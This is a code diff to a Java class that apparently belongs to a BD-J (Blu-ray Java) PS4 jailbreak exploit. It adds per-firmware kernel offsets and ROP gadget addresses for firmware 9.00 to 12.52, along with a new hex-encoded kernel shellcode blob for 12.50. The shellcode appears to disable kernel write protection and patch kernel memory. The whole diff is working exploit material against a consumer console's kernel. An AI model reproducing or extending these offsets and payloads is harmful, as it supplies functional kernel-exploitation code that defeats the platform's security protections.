@@ -1,6 +1,5 @@
 package org.bdj.external;
 
-import org.bdj.Status;
 import java.util.Hashtable;
 
 public class KernelOffset {
@@ -44,39 +43,43 @@ public class KernelOffset {
         ps4KernelOffsets = new Hashtable();
 
         // PS4 9.00
-        addFirmwareOffsets("9.00", 0x7f6f27L, 0x111f870L, 0x21eff20L, 0x221688dL, 0x1107f00L, 0x4c7adL);
+        addFirmwareOffsets("9.00", 0x7f6f27L, 0x111f870L, 0x21eff20L, 0x221688dL, 0x1107f00L, 0x4c7adL, 0x3977F0);
 
         // PS4 9.03/9.04  
-        addFirmwareOffsets("9.03", 0x7f4ce7L, 0x111b840L, 0x21ebf20L, 0x221288dL, 0x1103f00L, 0x5325bL);
-        addFirmwareOffsets("9.04", 0x7f4ce7L, 0x111b840L, 0x21ebf20L, 0x221288dL, 0x1103f00L, 0x5325bL);
+        addFirmwareOffsets("9.03", 0x7f4ce7L, 0x111b840L, 0x21ebf20L, 0x221288dL, 0x1103f00L, 0x5325bL, 0x3959F0);
+        addFirmwareOffsets("9.04", 0x7f4ce7L, 0x111b840L, 0x21ebf20L, 0x221288dL, 0x1103f00L, 0x5325bL, 0x3959F0);
 
         // PS4 9.50/9.51/9.60
-        addFirmwareOffsets("9.50", 0x769a88L, 0x11137d0L, 0x21a6c30L, 0x221a40dL, 0x1100ee0L, 0x15a6dL);
-        addFirmwareOffsets("9.51", 0x769a88L, 0x11137d0L, 0x21a6c30L, 0x221a40dL, 0x1100ee0L, 0x15a6dL);
-        addFirmwareOffsets("9.60", 0x769a88L, 0x11137d0L, 0x21a6c30L, 0x221a40dL, 0x1100ee0L, 0x15a6dL);
+        addFirmwareOffsets("9.50", 0x769a88L, 0x11137d0L, 0x21a6c30L, 0x221a40dL, 0x1100ee0L, 0x15a6dL, 0x85EE0);
+        addFirmwareOffsets("9.51", 0x769a88L, 0x11137d0L, 0x21a6c30L, 0x221a40dL, 0x1100ee0L, 0x15a6dL, 0x85EE0);
+        addFirmwareOffsets("9.60", 0x769a88L, 0x11137d0L, 0x21a6c30L, 0x221a40dL, 0x1100ee0L, 0x15a6dL, 0x85EE0);
 
         // PS4 10.00/10.01
-        addFirmwareOffsets("10.00", 0x7b5133L, 0x111b8b0L, 0x1b25bd0L, 0x1b9e08dL, 0x110a980L, 0x68b1L);
-        addFirmwareOffsets("10.01", 0x7b5133L, 0x111b8b0L, 0x1b25bd0L, 0x1b9e08dL, 0x110a980L, 0x68b1L);
+        addFirmwareOffsets("10.00", 0x7b5133L, 0x111b8b0L, 0x1b25bd0L, 0x1b9e08dL, 0x110a980L, 0x68b1L, 0x45B10);
+        addFirmwareOffsets("10.01", 0x7b5133L, 0x111b8b0L, 0x1b25bd0L, 0x1b9e08dL, 0x110a980L, 0x68b1L, 0x45B10);
 
         // PS4 10.50/10.70/10.71
-        addFirmwareOffsets("10.50", 0x7a7b14L, 0x111b910L, 0x1bf81f0L, 0x1be460dL, 0x110a5b0L, 0x50dedL);
-        addFirmwareOffsets("10.70", 0x7a7b14L, 0x111b910L, 0x1bf81f0L, 0x1be460dL, 0x110a5b0L, 0x50dedL);
-        addFirmwareOffsets("10.71", 0x7a7b14L, 0x111b910L, 0x1bf81f0L, 0x1be460dL, 0x110a5b0L, 0x50dedL);
+        addFirmwareOffsets("10.50", 0x7a7b14L, 0x111b910L, 0x1bf81f0L, 0x1be460dL, 0x110a5b0L, 0x50dedL, 0x25E330);
+        addFirmwareOffsets("10.70", 0x7a7b14L, 0x111b910L, 0x1bf81f0L, 0x1be460dL, 0x110a5b0L, 0x50dedL, 0x25E330);
+        addFirmwareOffsets("10.71", 0x7a7b14L, 0x111b910L, 0x1bf81f0L, 0x1be460dL, 0x110a5b0L, 0x50dedL, 0x25E330);
 
         // PS4 11.00
-        addFirmwareOffsets("11.00", 0x7fc26fL, 0x111f830L, 0x2116640L, 0x221c60dL, 0x1109350L, 0x71a21L);
+        addFirmwareOffsets("11.00", 0x7fc26fL, 0x111f830L, 0x2116640L, 0x221c60dL, 0x1109350L, 0x71a21L, 0x58F10);
 
         // PS4 11.02
-        addFirmwareOffsets("11.02", 0x7fc22fL, 0x111f830L, 0x2116640L, 0x221c60dL, 0x1109350L, 0x71a21L);
+        addFirmwareOffsets("11.02", 0x7fc22fL, 0x111f830L, 0x2116640L, 0x221c60dL, 0x1109350L, 0x71a21L, 0x58F10);
 
         // PS4 11.50/11.52
-        addFirmwareOffsets("11.50", 0x784318L, 0x111fa18L, 0x2136e90L, 0x21cc60dL, 0x110a760L, 0x704d5L);
-        addFirmwareOffsets("11.52", 0x784318L, 0x111fa18L, 0x2136e90L, 0x21cc60dL, 0x110a760L, 0x704d5L);
+        addFirmwareOffsets("11.50", 0x784318L, 0x111fa18L, 0x2136e90L, 0x21cc60d, 0x110a760L, 0x704d5L, 0xE6C20);
+        addFirmwareOffsets("11.52", 0x784318L, 0x111fa18L, 0x2136e90L, 0x21cc60d, 0x110a760L, 0x704d5L, 0xE6C20);
 
         // PS4 12.00/12.02
-        addFirmwareOffsets("12.00", 0x784798L, 0x111fa18L, 0x2136e90L, 0x21cc60dL, 0x110a760L, 0x47b31L);
-        addFirmwareOffsets("12.02", 0x784798L, 0x111fa18L, 0x2136e90L, 0x21cc60dL, 0x110a760L, 0x47b31L);
+        addFirmwareOffsets("12.00", 0x784798L, 0x111fa18L, 0x2136e90L, 0x21cc60dL, 0x110a760L, 0x47b31L, 0xE6C20);
+        addFirmwareOffsets("12.02", 0x784798L, 0x111fa18L, 0x2136e90L, 0x21cc60dL, 0x110a760L, 0x47b31L, 0xE6C20);
+
+        // PS4 12.50/12.52, fill only really needed ones
+        addFirmwareOffsets("12.50", 0, 0x111fa18L, 0x2136e90L, 0, 0x110a760L, 0x47b31L, 0xE6C20);
+        addFirmwareOffsets("12.52", 0, 0x111fa18L, 0x2136e90L, 0, 0x110a760L, 0x47b31L, 0xE6C20);
     }
 
     private static void initializeShellcodes() {
@@ -100,6 +103,8 @@ public class KernelOffset {
 
         shellcodeData.put("12.00", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981a3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1b3761b006689b9d3761b0066448981f47a6200c681cd0a0000ebc681cdd32b00ebc68111d42b00ebc6818dd42b00ebc681d1d42b00ebc6817dd62b00ebc6812ddb2b00ebc681fddb2b00eb66448989df836200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c681e6143900ebc781eec02f000000000066898164711b00c78118771b0090e93c01c78160d83b004831c0c3c6811aa71f0037c6811da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3");
 
+        shellcodeData.put("12.50", "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff0f22c0b8eb040000beeb040000bf90e9ffff41b8eb000000668981e3761b0041b9eb00000041baeb00000041bbeb000000b890e9ffff4881c2717904006689b1f3761b006689b913771b0066448981347b6200c681cd0a0000ebc6810dd42b00ebc68151d42b00ebc681cdd42b00ebc68111d52b00ebc681bdd62b00ebc6816ddb2b00ebc6813ddc2b00eb664489891f846200c7819004000000000000c681c2040000eb66448991b904000066448999b5040000c68126153900ebc7812ec12f0000000000668981a4711b00c78158771b0090e93c01c781a0d83b004831c0c3c6815aa71f0037c6815da71f0037c781802d100102000000488991882d1001c781ac2d1001010000000f20c0480d000001000f22c031c0c3");
+
         shellcodeData.put("9.04", shellcodeData.get("9.03"));
         shellcodeData.put("9.51", shellcodeData.get("9.50"));
         shellcodeData.put("9.60", shellcodeData.get("9.50"));
@@ -108,10 +113,11 @@ public class KernelOffset {
         shellcodeData.put("10.71", shellcodeData.get("10.50"));
         shellcodeData.put("11.52", shellcodeData.get("11.50"));
         shellcodeData.put("12.02", shellcodeData.get("12.00"));
+        shellcodeData.put("12.52", shellcodeData.get("12.50"));
     }
 
     private static void addFirmwareOffsets(String fw, long evf, long prison0, long rootvnode, 
-                                         long targetId, long sysent661, long jmpRsi) {
+                                         long targetId, long sysent661, long jmpRsi, long klLock) {
         Hashtable offsets = new Hashtable();
         offsets.put("EVF_OFFSET", new Long(evf));
         offsets.put("PRISON0", new Long(prison0));
@@ -119,6 +125,7 @@ public class KernelOffset {
         offsets.put("TARGET_ID_OFFSET", new Long(targetId));
         offsets.put("SYSENT_661_OFFSET", new Long(sysent661));
         offsets.put("JMP_RSI_GADGET", new Long(jmpRsi));
+        offsets.put("KL_LOCK", new Long(klLock));
         ps4KernelOffsets.put(fw, offsets);
     }
 
